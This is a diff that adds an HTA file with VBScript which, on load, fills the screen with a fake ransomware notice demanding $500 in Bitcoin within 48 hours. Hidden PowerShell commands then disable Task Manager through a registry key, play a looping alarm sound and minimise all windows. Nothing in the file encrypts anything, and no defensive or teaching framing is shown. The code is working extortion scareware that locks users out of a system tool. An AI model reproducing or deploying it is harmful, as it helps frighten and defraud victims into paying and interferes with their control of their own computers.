@@ -1,0 +1,38 @@
+<html>
+<head>
+  <title>YOUR FILES ARE ENCRYPTED</title>
+  <HTA:APPLICATION 
+    ID="ransomApp"
+    APPLICATIONNAME="RansomNote"
+    BORDER="none"
+    BORDERSTYLE="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="maximize">
+  <script language="VBScript">
+    Sub Window_OnLoad()
+      document.body.style.backgroundColor = "black"
+      document.body.style.color = "red"
+      document.body.style.fontSize = "32px"
+      document.body.style.textAlign = "center"
+      document.body.innerHTML = "<br><br><br><b>ALL YOUR FILES HAVE BEEN ENCRYPTED</b><br><br>" & _
+                                "Send $500 in Bitcoin to the address below to recover them.<br><br>" & _
+                                "<b>1HtaFakeRansomNoteAddr99Xy</b><br><br>" & _
+                                "You have 48 hours before everything is deleted forever."
+
+      Set WshShell = CreateObject("WScript.Shell")
+      ' Optional: disable task manager temporarily
+      WshShell.Run "powershell -windowstyle hidden -command ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 1""", 0, False
+
+      ' Optional: play alert sound in loop
+      WshShell.Run "powershell -c (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Critical Stop.wav').PlayLooping()", 0, False
+
+      ' Optional: hide taskbar
+      WshShell.Run "powershell -windowstyle hidden -command ""$t = New-Object -ComObject Shell.Application; $t.MinimizeAll();""", 0, False
+    End Sub
+  </script>
+</head>
+<body>
+</body>
+</html>
